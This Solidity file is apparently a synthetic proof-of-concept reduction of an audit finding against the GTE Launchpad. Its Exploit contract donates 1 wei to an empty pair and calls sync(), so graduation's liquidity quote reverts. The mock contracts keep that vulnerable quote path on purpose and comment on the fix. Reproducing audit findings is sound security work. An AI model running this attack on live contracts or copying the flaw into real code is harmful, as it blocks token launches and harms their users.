// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — DOS of Launchpad graduation via 1-wei donation + sync
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64857 / H-09)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: attacker donates 1 wei of quote to an empty target pair and
    calls sync(), producing one-sided reserves (0, >0). Graduation's
    addLiquidity path calls UniswapV2Library.quote which requires both
    reserves > 0 and reverts → DOS of graduation.

    Blamed path: Launchpad._graduate → router.addLiquidity → quote()
    (Launchpad.sol ~L500 @ f43e1eed).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract UniswapV2Pair {
    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;

    function initialize(address t0, address t1) external {
        token0 = t0;
        token1 = t1;
    }

    function getReserves() public view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, 0);
    }

    function sync() external {
        reserve0 = uint112(MockERC20(token0).balanceOf(address(this)));
        reserve1 = uint112(MockERC20(token1).balanceOf(address(this)));
    }
}

library UniswapV2Library {
    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
        require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
        // @> VULN (graduation path): one-sided reserves after attacker sync() fail here
        require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        // FIX (in Launchpad): if either reserve is 0, bypass router and pair.mint() directly
        amountB = (amountA * reserveB) / reserveA;
    }
}

/// @dev Reduced Launchpad._graduate that uses quote() against pair reserves.
contract Launchpad {
    bool public graduationBlocked;
    bool public graduated;

    function _graduate(address pair, address token, uint256 tokensToLock, uint256 /*quoteToLock*/) internal {
        (uint112 r0, uint112 r1,) = UniswapV2Pair(pair).getReserves();
        address t0 = UniswapV2Pair(pair).token0();
        uint256 reserveA;
        uint256 reserveB;
        if (token == t0) {
            reserveA = r0;
            reserveB = r1;
        } else {
            reserveA = r1;
            reserveB = r0;
        }
        // Mirrors router.addLiquidity → quote(amountADesired, reserveA, reserveB)
        UniswapV2Library.quote(tokensToLock, reserveA, reserveB);
        graduated = true;
    }

    function graduate(address pair, address token, uint256 tokensToLock, uint256 quoteToLock) external {
        try this.graduateExternal(pair, token, tokensToLock, quoteToLock) {
            // ok
        } catch {
            graduationBlocked = true;
            revert("graduation DOS: addLiquidity/quote failed");
        }
    }

    function graduateExternal(address pair, address token, uint256 tokensToLock, uint256 quoteToLock) external {
        require(msg.sender == address(this), "only self");
        _graduate(pair, token, tokensToLock, quoteToLock);
    }
}

contract Exploit {
    MockERC20 public launchToken; // CREATE 1
    MockERC20 public quoteToken; // CREATE 2
    UniswapV2Pair public pair; // CREATE 3
    Launchpad public launchpad; // CREATE 4 — vulnerable

    bool public dosed;

    constructor() {
        launchToken = new MockERC20("Launch", "LNCH");
        quoteToken = new MockERC20("Quote", "QUOTE");
        pair = new UniswapV2Pair();
        if (address(launchToken) < address(quoteToken)) {
            pair.initialize(address(launchToken), address(quoteToken));
        } else {
            pair.initialize(address(quoteToken), address(launchToken));
        }
        launchpad = new Launchpad();
    }

    function run() external {
        // 1. Attacker donates 1 wei quote + sync → one-sided reserves
        quoteToken.mint(address(this), 1);
        quoteToken.transfer(address(pair), 1);
        pair.sync();

        (uint112 r0, uint112 r1,) = pair.getReserves();
        require((r0 == 0 && r1 > 0) || (r1 == 0 && r0 > 0), "need one-sided reserves");

        // 2. Graduation tries addLiquidity/quote and reverts
        try launchpad.graduate(address(pair), address(launchToken), 1_000_000e18, 1_000_000e18) {
            dosed = false;
        } catch {
            dosed = true;
        }

        require(dosed, "harm not demonstrated: graduation should DOS");
        require(launchpad.graduationBlocked() || !launchpad.graduated(), "must block graduation");
        require(!launchpad.graduated(), "must not graduate");
    }
}
